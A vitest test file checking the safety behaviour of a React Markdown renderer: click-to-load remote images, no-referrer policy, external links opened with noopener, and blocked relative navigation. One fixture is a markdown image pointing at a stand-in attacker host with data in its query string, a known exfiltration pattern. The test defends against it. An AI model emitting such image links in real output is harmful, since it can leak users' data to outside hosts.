import { afterEach, beforeAll, expect, it } from 'vitest';
import { act, createElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { Markdown } from '../../src/renderer/components/ui/markdown';

let root: Root | undefined;
let container: HTMLDivElement | undefined;
beforeAll(() => { Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true }); });
afterEach(() => {
  act(() => root?.unmount());
  container?.remove();
  root = undefined;
  container = undefined;
});
function render(text: string) {
  container = document.createElement('div');
  document.body.append(container);
  root = createRoot(container);
  act(() => root!.render(createElement(Markdown, { id: 'm' }, text)));
  return container;
}

it('loads a remote image only after the user asks, naming its host', () => {
  const dom = render('![secret](https://evil.example/x.png?d=abc)');
  expect(dom.querySelector('img')).toBeNull();
  const button = dom.querySelector('button');
  expect(button?.textContent).toContain('evil.example');
  act(() => button!.click());
  expect(dom.querySelector('img')?.getAttribute('src')).toBe('https://evil.example/x.png?d=abc');
  expect(dom.querySelector('img')?.getAttribute('referrerpolicy')).toBe('no-referrer');
});

it('opens http(s) links outside the app and keeps relative links from navigating it', () => {
  const dom = render('[site](https://example.com) and [file](./notes.md)');
  const [external, relative] = Array.from(dom.querySelectorAll('a'));
  expect(external.getAttribute('target')).toBe('_blank');
  expect(external.getAttribute('rel')).toContain('noopener');
  const click = new MouseEvent('click', { bubbles: true, cancelable: true });
  relative.dispatchEvent(click);
  expect(click.defaultPrevented).toBe(true);
});

it('resolves reference links defined in another block', () => {
  const dom = render('See [the docs][1].\n\nMore text.\n\n[1]: https://example.com/docs');
  expect(dom.querySelector('a')?.getAttribute('href')).toBe('https://example.com/docs');
});
